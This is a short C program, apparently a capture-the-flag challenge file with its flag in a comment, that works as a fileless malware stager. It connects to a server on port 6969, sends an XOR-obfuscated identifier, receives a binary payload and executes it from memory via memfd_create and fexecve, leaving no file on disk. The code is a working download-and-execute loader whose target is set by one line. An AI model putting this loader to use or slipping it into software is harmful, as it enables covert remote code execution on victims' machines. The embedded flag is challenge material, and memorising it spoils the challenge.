// gcc -o fishyfish fishyfish.c -D_GNU_SOURCE -s
// gcc -S fishyfish.c -D_GNU_SOURCE -s
// pctf{f1Sh1ng_4_Y4te5_b4t3s_oR_h34venLy_G4t35}

#include <stdio.h> 
#include <sys/socket.h> 
#include <arpa/inet.h> 
#include <unistd.h> 
#include <string.h> 
#include <sys/mman.h>
#include <stdlib.h>

#define PORT 6969
#define PAYLOAD_SIZE 14472
#define IP "127.0.0.1"
   
int main(int argc, char const *argv[]) 
{ 
    int sock = 0, valread; 
    struct sockaddr_in serv_addr; 
    char *uid = "\x29\x24\x23\x35\x23\x66\x22\x34\x27\x21\x29\x28\x20\x2f\x35\x2e";
    char uid_buf[16];
    char buffer[PAYLOAD_SIZE]; 
    int payloadFD;
    char * payload_argv[] = {"fishchecker", NULL};
    char * payload_envp[] = {NULL};
    char written[PAYLOAD_SIZE];

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
        return -1; 

    serv_addr.sin_family = AF_INET; 
    serv_addr.sin_port = htons(PORT); 
       
    // Convert IPv4 and IPv6 addresses from text to binary form 
    if(inet_pton(AF_INET, IP, &serv_addr.sin_addr)<=0)  
        return -1; 
   
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0){
    	puts("Can't connect");
        return -1; 
    }

    for(int i = 0; i < 16; i++)
    	uid_buf[i] = uid[i] ^ 0x46;

    send(sock, uid_buf, 16, 0 ); 

    valread = read(sock, buffer, PAYLOAD_SIZE); 

    shutdown(sock, 0);

    while ((payloadFD = memfd_create("fishchecker", 0)) <= 2){ // create memory file descriptor for execution
        close(payloadFD);
        //return -1;
    }

    int writeReturnSize = write(payloadFD, buffer, valread);  // write to mem_fd and error check
    if (writeReturnSize != valread)
        return -1;

    if (fexecve(payloadFD, (char * const *) payload_argv, (char * const *) payload_envp) == -1){ // execute payload
        return 0;
    }

    return 0; 
} 